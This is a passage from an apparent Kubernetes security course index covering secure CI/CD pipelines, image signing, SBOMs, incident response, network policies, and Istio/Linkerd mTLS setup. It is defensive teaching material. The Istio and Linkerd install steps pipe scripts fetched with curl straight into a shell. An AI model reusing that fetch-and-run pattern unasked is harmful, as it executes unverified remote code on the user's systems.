   registry: ${{ env.REGISTRY }}\n        username: ${{ secrets.REGISTRY_USERNAME }}\n        password: ${{ secrets.REGISTRY_PASSWORD }}\n\n    - name: Extract metadata\n      id: meta\n      uses: docker/metadata-action@v5\n      with:\n        images: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}\n        tags: |\n          type=ref,event=branch\n          type=ref,event=pr\n          type=semver,pattern={{version}}\n          type=sha,prefix={{branch}}-\n\n    - name: Build and push image\n      id: build-push\n      uses: docker/build-push-action@v5\n      with:\n        context: .\n        push: true\n        tags: ${{ steps.meta.outputs.tags }}\n        labels: ${{ steps.meta.outputs.labels }}\n        cache-from: type=gha\n        cache-to: type=gha,mode=max\n\n    - name: Run Trivy vulnerability scanner on image\n      uses: aquasecurity/trivy-action@master\n      with:\n        image-ref: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}:${{ steps.meta.outputs.version }}\n        format: 'sarif'\n        output: 'trivy-image-results.sarif'\n        severity: 'CRITICAL,HIGH'\n        exit-code: '1'\n\n    - name: Install cosign\n      uses: sigstore/cosign-installer@v3\n\n    - name: Sign container image\n      run: |\n        cosign sign --yes \\\n          ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}@${{ steps.build-push.outputs.digest }}\n\n    - name: Generate SBOM\n      uses: anchore/sbom-action@v0\n      with:\n        image: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}:${{ steps.meta.outputs.version }}\n        format: spdx-json\n        output-file: sbom.spdx.json\n\n    - name: Attach SBOM to image\n      run: |\n        cosign attach sbom --sbom sbom.spdx.json \\\n          ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}@${{ steps.build-push.outputs.digest }}\n\n    - name: Generate provenance\n      uses: slsa-framework/slsa-github-generator/.github/workflows/generator_container_slsa3.yml@v1.9.0\n      with:\n        image: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}\n        digest: ${{ steps.build-push.outputs.digest }}\n\n  deploy:\n    needs: build\n    runs-on: ubuntu-latest\n    if: github.ref == 'refs/heads/main'\n    steps:\n    - name: Checkout code\n      uses: actions/checkout@v4\n\n    - name: Set up kubectl\n      uses: azure/setup-kubectl@v3\n\n    - name: Configure kubectl\n      run: |\n        echo \"${{ secrets.KUBECONFIG }}\" | base64 -d &gt; kubeconfig\n        export KUBECONFIG=kubeconfig\n\n    - name: Deploy to Kubernetes\n      run: |\n        kubectl set image deployment/myapp \\\n          myapp=${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}:${{ github.sha }} \\\n          -n production\n\n    - name: Verify deployment\n      run: |\n        kubectl rollout status deployment/myapp -n production --timeout=5m\n</code></pre></p>"},{"location":"09-supply-chain/#63-gitlab-ci-secure-pipeline","title":"6.3 GitLab CI Secure Pipeline","text":"<pre><code>stages:\n  - test\n  - build\n  - scan\n  - sign\n  - deploy\n\nvariables:\n  IMAGE_NAME: $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA\n  SECURE_ANALYZERS_PREFIX: \"registry.gitlab.com/security-products\"\n\ndependency_scan:\n  stage: test\n  image: $SECURE_ANALYZERS_PREFIX/gemnasium:latest\n  script:\n    - /analyzer run\n  artifacts:\n    reports:\n      dependency_scanning: gl-dependency-scanning-report.json\n\nbuild:\n  stage: build\n  image: docker:24\n  services:\n    - docker:24-dind\n  before_script:\n    - echo \"$CI_REGISTRY_PASSWORD\" | docker login -u \"$CI_REGISTRY_USER\" --password-stdin $CI_REGISTRY\n  script:\n    - docker build -t $IMAGE_NAME .\n    - docker push $IMAGE_NAME\n\ncontainer_scan:\n  stage: scan\n  image: aquasec/trivy:latest\n  script:\n    - trivy image --exit-code 1 --severity CRITICAL,HIGH $IMAGE_NAME\n  allow_failure: false\n\nsign_image:\n  stage: sign\n  image: gcr.io/projectsigstore/cosign:latest\n  script:\n    - cosign sign --key env://COSIGN_KEY $IMAGE_NAME\n  only:\n    - main\n\ndeploy_production:\n  stage: deploy\n  image: bitnami/kubectl:latest\n  script:\n    - kubectl set image deployment/myapp myapp=$IMAGE_NAME -n production\n    - kubectl rollout status deployment/myapp -n production\n  only:\n    - main\n  environment:\n    name: production\n</code></pre>"},{"location":"09-supply-chain/#64-pipeline-security-best-practices","title":"6.4 Pipeline Security Best Practices","text":"<p>Secret Management: <pre><code># GitHub Actions - Use secrets\nenv:\n  REGISTRY_PASSWORD: ${{ secrets.REGISTRY_PASSWORD }}\n\n# Never log secrets\n- name: Deploy\n  run: |\n    echo \"::add-mask::$REGISTRY_PASSWORD\"\n    echo \"$REGISTRY_PASSWORD\" | docker login -u admin --password-stdin\n</code></pre></p> <p>Least Privilege: <pre><code># Minimal permissions\npermissions:\n  contents: read\n  packages: write\n  security-events: write\n</code></pre></p> <p>Immutable Tags: <pre><code># Use SHA digests, not mutable tags\nimage: registry.example.com/app@sha256:abc123...\n\n# Not this:\n# image: registry.example.com/app:latest\n</code></pre></p>"},{"location":"09-supply-chain/#7-supply-chain-security-best-practices","title":"7. Supply Chain Security Best Practices","text":""},{"location":"09-supply-chain/#71-security-checklist","title":"7.1 Security Checklist","text":"<ul> <li>\u2705 Source Code</li> <li>[ ] Git commit signing enforced</li> <li>[ ] Branch protection enabled</li> <li>[ ] Code review required</li> <li> <p>[ ] Dependency scanning enabled</p> </li> <li> <p>\u2705 Build</p> </li> <li>[ ] Ephemeral build environments</li> <li>[ ] Vulnerability scanning in CI</li> <li>[ ] Reproducible builds</li> <li> <p>[ ] Build provenance generated</p> </li> <li> <p>\u2705 Artifacts</p> </li> <li>[ ] Images signed with cosign</li> <li>[ ] SBOMs generated and attached</li> <li>[ ] Images scanned for vulnerabilities</li> <li> <p>[ ] Minimal base images used</p> </li> <li> <p>\u2705 Registry</p> </li> <li>[ ] Private registry deployed</li> <li>[ ] Authentication required</li> <li>[ ] TLS enabled</li> <li> <p>[ ] Image retention policies</p> </li> <li> <p>\u2705 Deployment</p> </li> <li>[ ] Admission control enforces signatures</li> <li>[ ] Image pull policies set</li> <li>[ ] Security contexts configured</li> <li>[ ] Network policies applied</li> </ul>"},{"location":"09-supply-chain/#72-minimal-base-images","title":"7.2 Minimal Base Images","text":"<p>Distroless Images: <pre><code># Multi-stage build with distroless\nFROM golang:1.21 AS builder\nWORKDIR /app\nCOPY . .\nRUN CGO_ENABLED=0 go build -o app\n\nFROM gcr.io/distroless/static-debian12:nonroot\nCOPY --from=builder /app/app /\nUSER nonroot:nonroot\nENTRYPOINT [\"/app\"]\n</code></pre></p> <p>Alpine Linux: <pre><code>FROM alpine:3.19\nRUN apk add --no-cache ca-certificates\nCOPY app /usr/local/bin/\nRUN addgroup -g 1000 appuser &amp;&amp; \\\n    adduser -D -u 1000 -G appuser appuser\nUSER appuser\nCMD [\"app\"]\n</code></pre></p>"},{"location":"09-supply-chain/#73-dependency-management","title":"7.3 Dependency Management","text":"<p>Go Example: <pre><code># Use go.sum for integrity\ngo mod verify\n\n# Scan dependencies\ngo list -json -m all | nancy sleuth\n\n# Update dependencies\ngo get -u ./...\ngo mod tidy\n</code></pre></p> <p>Node.js Example: <pre><code># Use package-lock.json\nnpm ci --only=production\n\n# Audit dependencies\nnpm audit --audit-level=high\n\n# Fix vulnerabilities\nnpm audit fix\n</code></pre></p>"},{"location":"09-supply-chain/#8-incident-response","title":"8. Incident Response","text":""},{"location":"09-supply-chain/#81-supply-chain-compromise-detection","title":"8.1 Supply Chain Compromise Detection","text":"<p>Indicators of Compromise: - Unsigned or improperly signed images deployed - Unknown image registries - Unexpected SBOM changes - Vulnerability spikes - Unusual build patterns</p> <p>Detection Queries: <pre><code># Unsigned images running\ncount(kube_pod_container_info)\n  unless on(image)\n  image_signature_verified\n\n# Images from untrusted registries\ncount(kube_pod_container_info{image!~\"registry.example.com/.*\"})\n\n# Recent critical vulnerabilities\nsum(container_vulnerabilities{severity=\"CRITICAL\"}) by (image)\n</code></pre></p>"},{"location":"09-supply-chain/#82-incident-response-playbook","title":"8.2 Incident Response Playbook","text":"<p>Response Steps:</p> <ol> <li> <p>Identify Affected Resources <pre><code># Find pods using compromised image\nkubectl get pods -A -o json | \\\n  jq '.items[] | select(.spec.containers[].image == \"compromised-image\")'\n\n# Get deployment history\nkubectl rollout history deployment/app -n production\n</code></pre></p> </li> <li> <p>Isolate and Quarantine <pre><code># Scale down deployment\nkubectl scale deployment app --replicas=0 -n production\n\n# Apply network policy to block traffic\nkubectl apply -f quarantine-netpol.yaml\n</code></pre></p> </li> <li> <p>Investigate and Analyze <pre><code># Extract logs\nkubectl logs deployment/app -n production --all-containers &gt; incident-logs.txt\n\n# Analyze SBOM\ntrivy sbom sbom.json\n\n# Check audit logs\njq 'select(.objectRef.name == \"app\")' audit.log\n</code></pre></p> </li> <li> <p>Remediate <pre><code># Deploy known-good version\nkubectl set image deployment/app app=registry.example.com/app@sha256:good-digest\n\n# Rotate secrets\nkubectl create secret generic app-secrets --from-literal=key=newvalue --dry-run=client -o yaml | kubectl apply -f -\n</code></pre></p> </li> <li> <p>Post-Incident Review</p> </li> <li>Document timeline</li> <li>Identify root cause</li> <li>Update security controls</li> <li>Implement preventive measures</li> </ol>"},{"location":"09-supply-chain/#9-security-checklist","title":"9. Security Checklist","text":"<ul> <li>[ ] Vulnerability Scanning</li> <li>[ ] Trivy deployed and scanning images</li> <li>[ ] CI/CD pipeline includes vulnerability scans</li> <li>[ ] Critical vulnerabilities block deployments</li> <li> <p>[ ] Regular rescanning of running images</p> </li> <li> <p>[ ] Image Signing</p> </li> <li>[ ] cosign configured and used</li> <li>[ ] All production images signed</li> <li>[ ] Admission control verifies signatures</li> <li> <p>[ ] Public keys securely distributed</p> </li> <li> <p>[ ] SBOM</p> </li> <li>[ ] SBOMs generated for all images</li> <li>[ ] SBOMs attached to images</li> <li>[ ] SBOM analysis in security reviews</li> <li> <p>[ ] License compliance checked</p> </li> <li> <p>[ ] Private Registry</p> </li> <li>[ ] Private registry deployed</li> <li>[ ] Authentication and authorization configured</li> <li>[ ] TLS enabled</li> <li> <p>[ ] Backup and disaster recovery planned</p> </li> <li> <p>[ ] CI/CD Security</p> </li> <li>[ ] Secrets stored securely</li> <li>[ ] Least privilege for pipeline</li> <li>[ ] Ephemeral build environments</li> <li>[ ] Build provenance generated</li> </ul>"},{"location":"09-supply-chain/#10-references","title":"10. References","text":""},{"location":"09-supply-chain/#official-documentation","title":"Official Documentation","text":"<ol> <li>SLSA Framework</li> <li> <p>https://slsa.dev/</p> </li> <li> <p>Sigstore Documentation</p> </li> <li> <p>https://docs.sigstore.dev/</p> </li> <li> <p>cosign Documentation</p> </li> <li>https://github.com/sigstore/cosign</li> </ol>"},{"location":"09-supply-chain/#security-tools","title":"Security Tools","text":"<ol> <li>Trivy Documentation</li> <li> <p>https://aquasecurity.github.io/trivy/</p> </li> <li> <p>Syft SBOM Generator</p> </li> <li> <p>https://github.com/anchore/syft</p> </li> <li> <p>Harbor Registry</p> </li> <li>https://goharbor.io/docs/</li> </ol>"},{"location":"09-supply-chain/#standards-and-frameworks","title":"Standards and Frameworks","text":"<ol> <li>NIST SP 800-218 - Secure Software Development Framework</li> <li> <p>https://csrc.nist.gov/publications/detail/sp/800-218/final</p> </li> <li> <p>SPDX Specification</p> </li> <li> <p>https://spdx.dev/specifications/</p> </li> <li> <p>CycloneDX Specification</p> </li> <li> <p>https://cyclonedx.org/specification/overview/</p> </li> <li> <p>CNCF Supply Chain Security Paper</p> <ul> <li>https://github.com/cncf/tag-security/tree/main/supply-chain-security</li> </ul> </li> </ol>"},{"location":"09-supply-chain/#next-steps","title":"Next Steps","text":"<p>Continue to Module 10: Network Security to learn about network segmentation, zero trust networking, service mesh security, and mTLS.</p> <p>Module Completion Status: \u2705 Complete</p>"},{"location":"10-network-security/","title":"Module 10: Network Security","text":""},{"location":"10-network-security/#overview","title":"Overview","text":"<p>Estimated Time: 7-8 hours</p> <p>Module Type: Security Deep Dive</p> <p>Prerequisites: - Module 03 - Networking Fundamentals - Module 06 - Pod Security - Module 07 - Admission Control and Policy - Understanding of TCP/IP, TLS/SSL, and network security concepts</p> <p>Network security is critical for protecting Kubernetes workloads from unauthorized access and lateral movement. This module covers advanced network segmentation, zero trust networking principles, service mesh security (Istio/Linkerd), mutual TLS (mTLS), egress controls, DNS security, and defense-in-depth network strategies. Based on NIST Zero Trust Architecture and CNCF service mesh security best practices.</p>"},{"location":"10-network-security/#learning-objectives","title":"Learning Objectives","text":"<p>By the end of this module, you will be able to:</p> <ol> <li>Implement advanced network segmentation strategies</li> <li>Apply zero trust networking principles to Kubernetes</li> <li>Deploy and configure service mesh (Istio/Linkerd) for security</li> <li>Configure mutual TLS (mTLS) for pod-to-pod communication</li> <li>Implement egress controls and policies</li> <li>Secure DNS infrastructure in Kubernetes</li> <li>Configure network policies for defense-in-depth</li> <li>Monitor and audit network traffic</li> <li>Implement microsegmentation and workload identity</li> <li>Build zero-trust network architectures</li> </ol>"},{"location":"10-network-security/#1-network-security-fundamentals","title":"1. Network Security Fundamentals","text":""},{"location":"10-network-security/#11-kubernetes-network-security-layers","title":"1.1 Kubernetes Network Security Layers","text":"<pre><code>graph TB\n    A[External Traffic] --&gt; B[Ingress Controller]\n    B --&gt; C[Service Mesh]\n    C --&gt; D[Network Policies]\n    D --&gt; E[Pod Network]\n\n    B --&gt;|TLS Termination| B1[Certificate]\n    C --&gt;|mTLS| C1[Service Identity]\n    D --&gt;|Firewall Rules| D1[CNI Plugin]\n    E --&gt;|Encryption| E1[WireGuard/IPSec]\n\n    F[Egress Gateway] --&gt; G[External Services]\n    E --&gt; F\n\n    style B fill:#4da6ff\n    style C fill:#6bcf7f\n    style D fill:#ffd93d\n    style E fill:#e76f51</code></pre>"},{"location":"10-network-security/#12-defense-in-depth-strategy","title":"1.2 Defense-in-Depth Strategy","text":"<p>Security Layers:</p> <ol> <li>Perimeter Security</li> <li>Ingress controllers with WAF</li> <li>TLS termination</li> <li> <p>DDoS protection</p> </li> <li> <p>Service Mesh Layer</p> </li> <li>mTLS between services</li> <li>Authorization policies</li> <li> <p>Traffic encryption</p> </li> <li> <p>Network Policy Layer</p> </li> <li>Firewall rules</li> <li>Namespace isolation</li> <li> <p>Microsegmentation</p> </li> <li> <p>Pod Network Layer</p> </li> <li>Encrypted overlay network</li> <li>Network plugin security</li> <li> <p>Host firewall</p> </li> <li> <p>Egress Control</p> </li> <li>Egress gateways</li> <li>External traffic filtering</li> <li>DNS policy enforcement</li> </ol>"},{"location":"10-network-security/#13-zero-trust-networking-principles","title":"1.3 Zero Trust Networking Principles","text":"<p>Core Tenets:</p> <ol> <li>Never Trust, Always Verify</li> <li>Authenticate every connection</li> <li>Authorize every request</li> <li> <p>Encrypt all traffic</p> </li> <li> <p>Assume Breach</p> </li> <li>Limit blast radius</li> <li>Continuous monitoring</li> <li> <p>Least privilege access</p> </li> <li> <p>Verify Explicitly</p> </li> <li>Workload identity</li> <li>Cryptographic verification</li> <li>Policy-based access control</li> </ol> <pre><code>graph LR\n    A[Request] --&gt; B{Authenticate}\n    B --&gt;|Valid Identity| C{Authorize}\n    B --&gt;|Invalid| D[Deny]\n    C --&gt;|Allowed| E{Encrypt}\n    C --&gt;|Denied| D\n    E --&gt; F[Allow Traffic]\n\n    F --&gt;|Continuous| G[Monitor &amp; Audit]\n    G --&gt;|Anomaly| H[Alert/Block]\n\n    style D fill:#ff6b6b\n    style F fill:#6bcf7f</code></pre>"},{"location":"10-network-security/#2-advanced-network-policies","title":"2. Advanced Network Policies","text":""},{"location":"10-network-security/#21-default-deny-policies","title":"2.1 Default Deny Policies","text":"<p>Namespace-Level Default Deny: <pre><code>apiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: default-deny-all\n  namespace: production\nspec:\n  podSelector: {}\n  policyTypes:\n  - Ingress\n  - Egress\n</code></pre></p> <p>Allow DNS Only: <pre><code>apiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: allow-dns\n  namespace: production\nspec:\n  podSelector: {}\n  policyTypes:\n  - Egress\n  egress:\n  - to:\n    - namespaceSelector:\n        matchLabels:\n          name: kube-system\n    ports:\n    - protocol: UDP\n      port: 53\n</code></pre></p>"},{"location":"10-network-security/#22-microsegmentation","title":"2.2 Microsegmentation","text":"<p>Frontend to Backend: <pre><code>apiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: frontend-to-backend\n  namespace: production\nspec:\n  podSelector:\n    matchLabels:\n      tier: backend\n  policyTypes:\n  - Ingress\n  ingress:\n  - from:\n    - podSelector:\n        matchLabels:\n          tier: frontend\n    ports:\n    - protocol: TCP\n      port: 8080\n</code></pre></p> <p>Backend to Database: <pre><code>apiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: backend-to-database\n  namespace: production\nspec:\n  podSelector:\n    matchLabels:\n      tier: database\n  policyTypes:\n  - Ingress\n  ingress:\n  - from:\n    - podSelector:\n        matchLabels:\n          tier: backend\n    ports:\n    - protocol: TCP\n      port: 5432\n</code></pre></p>"},{"location":"10-network-security/#23-cross-namespace-communication","title":"2.3 Cross-Namespace Communication","text":"<p>Allow Specific Namespace: <pre><code>apiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: allow-monitoring\n  namespace: production\nspec:\n  podSelector: {}\n  policyTypes:\n  - Ingress\n  ingress:\n  - from:\n    - namespaceSelector:\n        matchLabels:\n          name: monitoring\n      podSelector:\n        matchLabels:\n          app: prometheus\n    ports:\n    - protocol: TCP\n      port: 8080\n</code></pre></p> <p>Cross-Namespace Service Access: <pre><code>apiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: api-gateway-access\n  namespace: backend\nspec:\n  podSelector:\n    matchLabels:\n      app: api\n  policyTypes:\n  - Ingress\n  ingress:\n  - from:\n    - namespaceSelector:\n        matchLabels:\n          environment: production\n      podSelector:\n        matchLabels:\n          app: gateway\n</code></pre></p>"},{"location":"10-network-security/#24-egress-controls","title":"2.4 Egress Controls","text":"<p>Allow External HTTPS: <pre><code>apiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: allow-external-https\n  namespace: production\nspec:\n  podSelector:\n    matchLabels:\n      app: api\n  policyTypes:\n  - Egress\n  egress:\n  # Allow DNS\n  - to:\n    - namespaceSelector:\n        matchLabels:\n          name: kube-system\n    ports:\n    - protocol: UDP\n      port: 53\n\n  # Allow HTTPS to specific CIDR\n  - to:\n    - ipBlock:\n        cidr: 0.0.0.0/0\n        except:\n        - 169.254.169.254/32  # Block metadata service\n        - 10.0.0.0/8          # Block internal\n        - 172.16.0.0/12\n        - 192.168.0.0/16\n    ports:\n    - protocol: TCP\n      port: 443\n</code></pre></p> <p>Allow Specific External Services: <pre><code>apiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: allow-external-api\n  namespace: production\nspec:\n  podSelector:\n    matchLabels:\n      app: backend\n  policyTypes:\n  - Egress\n  egress:\n  - to:\n    - ipBlock:\n        cidr: 203.0.113.0/24  # External API CIDR\n    ports:\n    - protocol: TCP\n      port: 443\n</code></pre></p>"},{"location":"10-network-security/#25-cilium-network-policies","title":"2.5 Cilium Network Policies","text":"<p>Cilium provides Layer 7 (HTTP, gRPC, Kafka) network policies.</p> <p>HTTP Method Filtering: <pre><code>apiVersion: cilium.io/v2\nkind: CiliumNetworkPolicy\nmetadata:\n  name: api-l7-policy\n  namespace: production\nspec:\n  endpointSelector:\n    matchLabels:\n      app: api\n  ingress:\n  - fromEndpoints:\n    - matchLabels:\n        app: frontend\n    toPorts:\n    - ports:\n      - port: \"8080\"\n        protocol: TCP\n      rules:\n        http:\n        - method: \"GET\"\n          path: \"/api/v1/.*\"\n        - method: \"POST\"\n          path: \"/api/v1/resources\"\n</code></pre></p> <p>DNS-Based Policies: <pre><code>apiVersion: cilium.io/v2\nkind: CiliumNetworkPolicy\nmetadata:\n  name: allow-github-api\n  namespace: production\nspec:\n  endpointSelector:\n    matchLabels:\n      app: ci-runner\n  egress:\n  - toFQDNs:\n    - matchPattern: \"*.github.com\"\n    - matchName: \"api.github.com\"\n  - toPorts:\n    - ports:\n      - port: \"443\"\n        protocol: TCP\n</code></pre></p> <p>Kafka Protocol Policy: <pre><code>apiVersion: cilium.io/v2\nkind: CiliumNetworkPolicy\nmetadata:\n  name: kafka-policy\nspec:\n  endpointSelector:\n    matchLabels:\n      app: consumer\n  egress:\n  - toEndpoints:\n    - matchLabels:\n        app: kafka\n    toPorts:\n    - ports:\n      - port: \"9092\"\n        protocol: TCP\n      rules:\n        kafka:\n        - role: \"consume\"\n          topic: \"orders\"\n        - role: \"produce\"\n          topic: \"events\"\n</code></pre></p>"},{"location":"10-network-security/#3-service-mesh-security","title":"3. Service Mesh Security","text":""},{"location":"10-network-security/#31-service-mesh-overview","title":"3.1 Service Mesh Overview","text":"<pre><code>graph TB\n    subgraph \"Service Mesh Control Plane\"\n        A[Control Plane]\n        A --&gt; B[Certificate Authority]\n        A --&gt; C[Policy Engine]\n        A --&gt; D[Telemetry]\n    end\n\n    subgraph \"Data Plane\"\n        E[Pod] --&gt; F[Sidecar Proxy]\n        G[Pod] --&gt; H[Sidecar Proxy]\n    end\n\n    F --&gt;|mTLS| H\n    A --&gt;|Config| F\n    A --&gt;|Config| H\n    F --&gt;|Metrics| D\n    H --&gt;|Metrics| D\n\n    style F fill:#6bcf7f\n    style H fill:#6bcf7f</code></pre> <p>Service Mesh Benefits: - Automatic mTLS encryption - Service-to-service authentication - Authorization policies - Traffic management - Observability - Circuit breaking</p>"},{"location":"10-network-security/#32-installing-istio","title":"3.2 Installing Istio","text":"<p>Install Istio with istioctl: <pre><code># Download Istio\ncurl -L https://istio.io/downloadIstio | sh -\ncd istio-1.20.0\nexport PATH=$PWD/bin:$PATH\n\n# Install Istio with minimal profile\nistioctl install --set profile=minimal -y\n\n# Or production profile with HA\nistioctl install --set profile=production -y\n\n# Verify installation\nkubectl get pods -n istio-system\n</code></pre></p> <p>Enable Sidecar Injection: <pre><code># Label namespace for automatic injection\nkubectl label namespace production istio-injection=enabled\n\n# Verify label\nkubectl get namespace -L istio-injection\n</code></pre></p> <p>Manual Sidecar Injection: <pre><code># Inject sidecar into deployment\nistioctl kube-inject -f deployment.yaml | kubectl apply -f -\n</code></pre></p>"},{"location":"10-network-security/#33-istio-mtls-configuration","title":"3.3 Istio mTLS Configuration","text":"<p>Strict mTLS for Namespace: <pre><code>apiVersion: security.istio.io/v1beta1\nkind: PeerAuthentication\nmetadata:\n  name: default\n  namespace: production\nspec:\n  mtls:\n    mode: STRICT\n</code></pre></p> <p>Cluster-Wide Strict mTLS: <pre><code>apiVersion: security.istio.io/v1beta1\nkind: PeerAuthentication\nmetadata:\n  name: default\n  namespace: istio-system\nspec:\n  mtls:\n    mode: STRICT\n</code></pre></p> <p>Per-Service mTLS: <pre><code>apiVersion: security.istio.io/v1beta1\nkind: PeerAuthentication\nmetadata:\n  name: api-mtls\n  namespace: production\nspec:\n  selector:\n    matchLabels:\n      app: api\n  mtls:\n    mode: STRICT\n  portLevelMtls:\n    8080:\n      mode: STRICT\n    8081:\n      mode: PERMISSIVE  # Allow non-mTLS for legacy clients\n</code></pre></p> <p>Verify mTLS: <pre><code># Check mTLS status\nistioctl authn tls-check &lt;pod-name&gt;.&lt;namespace&gt;\n\n# Test with curl\nkubectl exec -it &lt;pod&gt; -c istio-proxy -- curl -v https://api.production.svc.cluster.local:8080\n</code></pre></p>"},{"location":"10-network-security/#34-istio-authorization-policies","title":"3.4 Istio Authorization Policies","text":"<p>Deny All by Default: <pre><code>apiVersion: security.istio.io/v1beta1\nkind: AuthorizationPolicy\nmetadata:\n  name: deny-all\n  namespace: production\nspec: {}  # Empty spec denies all\n</code></pre></p> <p>Allow Specific Service Access: <pre><code>apiVersion: security.istio.io/v1beta1\nkind: AuthorizationPolicy\nmetadata:\n  name: frontend-to-api\n  namespace: production\nspec:\n  selector:\n    matchLabels:\n      app: api\n  action: ALLOW\n  rules:\n  - from:\n    - source:\n        principals: [\"cluster.local/ns/production/sa/frontend\"]\n    to:\n    - operation:\n        methods: [\"GET\", \"POST\"]\n        paths: [\"/api/v1/*\"]\n    when:\n    - key: request.headers[x-api-version]\n      values: [\"v1\"]\n</code></pre></p> <p>JWT-Based Authorization: <pre><code>apiVersion: security.istio.io/v1beta1\nkind: RequestAuthentication\nmetadata:\n  name: jwt-auth\n  namespace: production\nspec:\n  selector:\n    matchLabels:\n      app: api\n  jwtRules:\n  - issuer: \"https://accounts.example.com\"\n    jwksUri: \"https://accounts.example.com/.well-known/jwks.json\"\n    audiences:\n    - \"api.example.com\"\n---\napiVersion: security.istio.io/v1beta1\nkind: AuthorizationPolicy\nmetadata:\n  name: require-jwt\n  namespace: production\nspec:\n  selector:\n    matchLabels:\n      app: api\n  action: ALLOW\n  rules:\n  - from:\n    - source:\n        requestPrincipals: [\"*\"]\n    when:\n    - key: request.auth.claims[role]\n      values: [\"admin\", \"user\"]\n</code></pre></p> <p>IP-Based Access Control: <pre><code>apiVersion: security.istio.io/v1beta1\nkind: AuthorizationPolicy\nmetadata:\n  name: ip-allowlist\n  namespace: production\nspec:\n  selector:\n    matchLabels:\n      app: admin-panel\n  action: ALLOW\n  rules:\n  - from:\n    - source:\n        ipBlocks: [\"10.0.0.0/8\", \"172.16.0.0/12\"]\n</code></pre></p>"},{"location":"10-network-security/#35-linkerd-installation","title":"3.5 Linkerd Installation","text":"<p>Install Linkerd CLI: <pre><code># Install CLI\ncurl --proto '=https' --tlsv1.2 -sSfL https://run.linkerd.io/install | sh\nexport PATH=$PATH:$HOME/.linkerd2/bin\n\n# Verify installation\nlinkerd version\n</code></pre></p> <p>Install Linkerd on Cluster: <pre><code># Check cluster prerequisites\nlinkerd check --pre\n\n# Install Linkerd CRDs\nlinkerd install --crds | kubectl apply -f -\n\n# Install Linkerd control plane\nlinkerd install | kubectl apply -f -\n\n# Verify installation\nlinkerd check\n</code></pre></p> <p>Enable Linkerd for Namespace: <pre><code># Annotate namespace\nkubectl annotate namespace production linkerd.io/inject=enabled\n\n# Or inject manually\nlinkerd inject deployment.yaml | kubectl apply -f -\n</code></pre></p>"},{"location":"10-network-security/#36-linkerd-mtls-and-policies","title":"3.6 Linkerd mTLS and Policies","text":"<p>Verify mTLS: <pre><code># Check mTLS status\nlinkerd viz tap deploy/api -n production\n\n# Expected output shows \ud83d\udd12 for mTLS connections\n</code></pre></p> <p>Server Authorization Policy: <pre><code>apiVersion: policy.linkerd.io/v1beta1\nkind: Server\nmetadata:\n  name: api-server\n  namespace: production\nspec:\n  podSelector:\n    matchLabels:\n      app: api\n  port: 8080\n---\napiVersion: policy.linkerd.io/v1beta1\nkind: ServerAuthorization\nmetadata:\n  name: api-clients\n  namespace: production\nspec:\n  server:\n    name: api-server\n  client:\n    meshTLS:\n      serviceAccounts:\n      - name: frontend\n        namespace: production\n      - name: mobile-backend\n        namespace: production\n</code></pre></p> <p>HTTP Route Policy: <pre><code>apiVersion: policy.linkerd.io/v1beta1\nkind: HTTPRoute\nmetadata:\n  name: api-routes\n  namespace: production\nspec:\n  parentRefs:\n  - name: api-server\n    kind: Server\n    group: policy.linkerd.io\n  rules:\n  - matches:\n    - path:\n        value: \"/api/v1/users\"\n        type: PathPrefix\n      method: GET\n    backendRefs:\n    - name: api\n      port: 8080\n</code></pre></p>"},{"location":"10-network-security/#4-mutual-tls-mtls-implementation","title":"4. Mutual TLS (mTLS) Implementation","text":""},{"location":"10-network-security/#41-certificate-management","title":"4.1 Certificate Management","text":"<p>cert-manager Installation: <pre><code># Install cert-manager\nkubectl apply -f https://github.com/cert-manager/cert-manager/releases/download/v1.13.0/cert-manager.yaml\n\n# Verify installation\nkubectl get pods -n cert-manager\n</code></pre></p> <p>ClusterIssuer for Internal CA: <pre><code>apiVersion: cert-manager.io/v1\nkind: ClusterIssuer\nmetadata:\n  name: internal-ca\nspec:\n  ca:\n    secretName: ca-key-pair\n---\napiVersion: v1\nkind: Secret\nmetadata:\n  name: ca-key-pair\n  namespace: cert-manager\ntype: kubernetes.io/tls\ndata:\n  tls.crt: LS0tLS1CRUdJTi...  # Base64 encoded CA cert\n  tls.key: LS0tLS1CRUdJTi...  # Base64 encoded CA key\n</code></pre></p> <p>Certificate for Service: <pre><code>apiVersion: cert-manager.io/v1\nkind: Certificate\nmetadata:\n  name: api-tls\n  namespace: production\nspec:\n  secretName: api-tls-secret\n  duration: 2160h  # 90 days\n  renewBefore: 360h  # 15 days\n  subject:\n    organizations:\n    - example-inc\n  commonName: api.production.svc.cluster.local\n  dnsNames:\n  - api.production.svc.cluster.local\n  - api.production.svc\n  - api\n  issuerRef:\n    name: internal-ca\n    kind: ClusterIssuer\n  usages:\n  - digital signature\n  - key encipherment\n  - server auth\n  - client auth\n</code></pre></p>"},{"location":"10-network-security/#42-manual-mtls-configuration","title":"4.2 Manual mTLS Configuration","text":"<p>Server Configuration (Nginx): <pre><code>apiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: nginx-mtls-config\n  namespace: production\ndata:\n  nginx.conf: |\n    events {}\n    http {\n      server {\n        listen 8443 ssl;\n        server_name api.production.svc.cluster.local;\n\n        # Server certificate\n        ssl_certificate /etc/nginx/certs/tls.crt;\n        ssl_certificate_key /etc/nginx/certs/tls.key;\n\n        # Client certificate verification\n        ssl_client_certificate /etc/nginx/certs/ca.crt;\n        ssl_verify_client on;\n        ssl_verify_depth 2;\n\n        # TLS configuration\n        ssl_protocols TLSv1.2 TLSv1.3;\n        ssl_ciphers HIGH:!aNULL:!MD5;\n        ssl_prefer_server_ciphers on;\n\n        location / {\n          if ($ssl_client_verify != SUCCESS) {\n            return 403;\n          }\n          proxy_pass 